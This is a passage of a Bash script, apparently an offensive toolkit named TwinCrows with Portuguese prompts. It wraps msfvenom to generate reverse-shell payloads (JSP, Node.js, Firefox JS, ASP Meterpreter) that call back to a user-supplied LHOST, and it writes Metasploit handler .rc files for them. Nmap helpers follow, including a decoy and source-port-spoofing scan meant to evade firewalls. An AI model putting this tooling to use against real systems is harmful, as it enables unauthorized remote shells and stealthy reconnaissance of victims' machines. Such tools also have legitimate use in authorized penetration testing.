					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"2")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.jsp: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/java_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload java/jsp_shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/java_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"3")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/js_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload nodejs/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/js_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p nodejs/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"4")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/firefox_js_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload firefox/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/firefox_js_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p firefox/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"5")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: pagina.asp: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/asp_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/asp_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;


				"0")
					tc_payload
				;;
				*)
		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
                		 ;;

			esac
			done

		;;


		0)
			exec $TCPath/TwinCrows
		;;
		*)
	                echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
       		 ;;



	esac
	done

}








nmap_host() {
	if [ -z "$2" ]
	then
		nmap -sn $1 -oG nmap_host_save -v0 
		cat nmap_host_save | grep "Host" | cut -d " " -f2
		rm -f nmap_host_save

	else
		nmap -sn $1 -oG nmap_host_save -v0
		cat nmap_host_save | grep "Host" | cut -d " " -f2 > $2
		cat nmap_host_save | grep "Host" | cut -d " " -f2
		rm -f nmap_host_save
		echo -e "\n\n Hosts salvos no arquivo $2"
	fi
}

nmap_padrao() {
	if [ -z "$2" ]
	then
		nmap -sS -v -Pn $1
	else
		nmap -sS -v -Pn $1 > $2
		echo -e "\n\nArquivo salvo em $2"
	fi
}

nmap_portas() {
	if [ -z "$3" ] 
	then
		nmap -sS -p $2  --open -Pn $1
	else
		nmap -sS -p $2  --open -Pn $1 > $3
		echo -e "\n\narquivo salvo em $3"
	fi
}

nmap_firewall() {
	if [ -z "$5" ]
	then
		nmap -v -sS -O -sV -g $2 -D RND:$3 -T4 -p $4 -Pn --open $1

	else
		nmap -v -sS -O -sV -g $2 -D RND:$3 -T4 -p $4 -Pn --open $1 > $5
		cat $5
		echo -e "\n\nArquivo salvo em $5\n\n"
	fi
}
